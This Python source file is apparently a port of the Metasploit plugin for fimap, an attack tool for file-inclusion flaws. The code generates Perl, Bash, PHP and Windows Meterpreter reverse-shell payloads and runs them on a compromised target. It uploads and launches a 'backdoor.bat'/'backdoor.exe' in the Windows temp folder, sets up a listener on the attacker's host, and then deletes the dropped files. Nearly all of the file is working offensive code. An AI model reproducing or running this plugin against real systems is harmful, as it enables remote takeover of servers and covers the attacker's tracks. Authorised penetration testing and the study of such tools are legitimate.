"""MSF Plugin — Metasploit integration for fimap.

Generates Metasploit payloads via msfpayload/msfencode CLI tools and sets
up a multi/handler listener via msfconsole XML-RPC.

Original author: Xavier Garcia <xavi.garcia@gmail.com>
Python3 port: 2026

Usage from exploit mode:
    Select "Executes MSF reverse payloads" → choose payload type
    → enter LHOST/LPORT/msfconsole password → payload injected.
"""

from __future__ import annotations

import getpass
import os
import tempfile
from typing import Any, TYPE_CHECKING

from plugins.msf.pymetasploit import (
    MsfWrapper,
    MsfXmlRpcListener,
    MsfError,
)

if TYPE_CHECKING:
    # Interface expected from fimap plugin system (not yet built).
    # Plugin receives a HaxHelper instance with these methods:
    #   .isUnix() -> bool
    #   .isWindows() -> bool
    #   .getLangName() -> str
    #   .executeSystemCommand(cmd: str) -> str | None
    #   .executeCode(code: str) -> str | None
    #   .concatCommands(commands: list[str]) -> str
    #   .uploadfile(local: str, remote: str, chunksize: int) -> int
    #   .drawBox(header: str, lines: list[str]) -> None

    class HaxHelper:
        def isUnix(self) -> bool: ...
        def isWindows(self) -> bool: ...
        def getLangName(self) -> str: ...
        def executeSystemCommand(self, cmd: str) -> str | None: ...
        def executeCode(self, code: str) -> str | None: ...
        def concatCommands(self, cmds: list[str]) -> str: ...
        def uploadfile(self, local: str, remote: str, chunksize: int = -1) -> int: ...
        def drawBox(self, header: str, lines: list[str]) -> None: ...


class MsfPlugin:
    """MSF reverse-tcp payload plugin.

    Conforms to the fimap plugin interface:
      plugin_init() / plugin_loaded()
      plugin_exploit_modes_requested(langClass, isSystem, isUnix) -> list
      plugin_callback_handler(callback_string, haxhelper) -> None
    """

    # plugin.xml metadata (would come from plugin.xml descriptor)
    PLUGIN_NAME = "msf_bindings"
    PLUGIN_VERSION = 2
    PLUGIN_AUTHOR = "Xavier Garcia"
    PLUGIN_EMAIL = "xavi.garcia@gmail.com"
    PLUGIN_URL = "https://github.com/fimap"

    def __init__(self, config: dict | None = None):
        self._config = config or {}
        self._lhost = ""
        self._lport = ""
        self._password = ""
        self._is_shellcode = False

    #=== plugin lifecycle =====================================================

    def plugin_init(self) -> None:
        """Called when plugin is first loaded."""
        pass

    def plugin_loaded(self) -> None:
        """Called after all plugins are loaded."""
        pass

    #=== plugin metadata (would come from plugin.xml) =========================

    def getPluginName(self) -> str:
        return self.PLUGIN_NAME

    def getPluginVersion(self) -> int:
        return self.PLUGIN_VERSION

    def getPluginAutor(self) -> str:
        return self.PLUGIN_AUTHOR

    def getPluginEmail(self) -> str:
        return self.PLUGIN_EMAIL

    def getPluginURL(self) -> str:
        return self.PLUGIN_URL

    #=== exploit modes ========================================================

    def plugin_exploit_modes_requested(
        self,
        lang_class: Any,
        is_system: bool,
        is_unix: bool,
    ) -> list[tuple[str, str]]:
        """Return entries for the exploit-mode attack menu."""
        if is_system:
            return [("Executes MSF reverse payloads", "msf.reverse_tcp")]
        return []

    #=== unix payload menu ====================================================

    def _msf_menu_unix(
        self,
        msf: MsfWrapper,
        haxhelper: HaxHelper,
    ) -> bool:
        print("Available payloads:")
        print("1) Perl reverse tcp")
        print("2) Bash reverse tcp")
        print("3) PHP reverse tcp")
        result = input("Choose your payload: ")

        try:
            choice = int(result)
        except ValueError:
            return self._msf_menu_unix(msf, haxhelper)  # ponytail: retry

        if choice == 1:
            self._is_shellcode = True
            msf.linuxPerlReverseShell(self._lhost, self._lport)
            msf.createPayload()
            return True

        elif choice == 2:
            self._is_shellcode = True
            msf.linuxBashReverseShell(self._lhost, self._lport)
            msf.createPayload()
            print("Warning: Bash payload will run in foreground — fimap may hang.")
            return True

        elif choice == 3:
            if haxhelper.getLangName().lower() == "php":
                self._is_shellcode = False
                msf.phpReverseShell(self._lhost, self._lport)
                msf.createPayload()
                msf.loadCustomPayload("<?php\n" + msf.getPayload() + "\n?>")
                print("Warning: PHP payload will run in foreground — fimap may hang.")
                return True
            else:
                print("PHP payload requires PHP target language.")
                return False

        return self._msf_menu_unix(msf, haxhelper)

    #=== parameter input ======================================================

    def _get_parameters(self) -> None:
        self._lhost = input("Please, introduce lhost: ").strip()
        self._lport = input("Please, introduce lport: ").strip()
        self._password = getpass.getpass("Please, introduce the password for msfconsole: ")

    #=== listener setup =======================================================

    def _set_listener(self, payload: str) -> None:
        listener = MsfXmlRpcListener()
        listener.setPassword(self._password)
        listener.setLhost(self._lhost)
        listener.setLport(self._lport)
        listener.setPayload(payload)

        print("Creating listener... ")
        try:
            listener.login()
            listener.launchHandler()
            print(
                "Listener created: PAYLOAD:%s  LHOST:%s LPORT:%s"
                % (listener.getPayload(), listener.getLhost(), listener.getLport())
            )
        except MsfError as err:
            print("Listener error: %s" % err)

    #=== callback handler =====================================================

    def plugin_callback_handler(self, callback_string: str, haxhelper: HaxHelper) -> int | None:
        """Handle the selected attack callback."""
        if callback_string != "msf.reverse_tcp":
            return None

        self._get_parameters()

        if haxhelper.isUnix():
            return self._handle_unix(haxhelper)
        else:
            return self._handle_windows(haxhelper)

    def _handle_unix(self, haxhelper: HaxHelper) -> int:
        msf = MsfWrapper()

        if not self._msf_menu_unix(msf, haxhelper):
            print("Sorry, this payload is not supported on this target.")
            return 0

        self._set_listener("cmd/unix/reverse_netcat")

        print("Executing your payload ... ")
        if self._is_shellcode:
            result = haxhelper.executeSystemCommand(msf.getPayload())
        else:
            result = haxhelper.executeCode(msf.getPayload())

        if result:
            print(result.strip())
        return 0

    def _handle_windows(self, haxhelper: HaxHelper) -> int:
        msf = MsfWrapper()
        msf.winMeterpreterReverseTcp(self._lhost, self._lport)
        msf.createPayload()
        msf.encodeWinDebug()

        # Write payload to temp file for upload
        fd, tmp_payload = tempfile.mkstemp(prefix="pymetasploit")
        os.close(fd)
        with open(tmp_payload, "w") as f:
            f.write(msf.getPayload())

        # Upload to target
        tmp_dir = haxhelper.executeSystemCommand("echo %TEMP%")
        if tmp_dir:
            tmp_dir = tmp_dir.strip()
        else:
            tmp_dir = "C:\\Windows\\Temp"

        haxhelper.executeSystemCommand(
            haxhelper.concatCommands(["cd " + tmp_dir, " > T"])
        )

        dest = tmp_dir + "\\backdoor.bat"
        nbytes = haxhelper.uploadfile(tmp_payload, dest, -1)
        os.unlink(tmp_payload)

        print("%d bytes written to '%s'." % (nbytes, dest))

        self._set_listener("windows/meterpreter/reverse_tcp")

        print("Launching now...")
        haxhelper.executeSystemCommand(
            haxhelper.concatCommands(["cd " + tmp_dir, dest])
        )
        haxhelper.executeSystemCommand(tmp_dir + "\\backdoor.exe")
        haxhelper.executeSystemCommand("del " + tmp_dir + "\\backdoor.exe")
        haxhelper.executeSystemCommand("del " + tmp_dir + "\\backdoor.bat")
        haxhelper.executeSystemCommand("del " + tmp_dir + "\\T")

        return 0
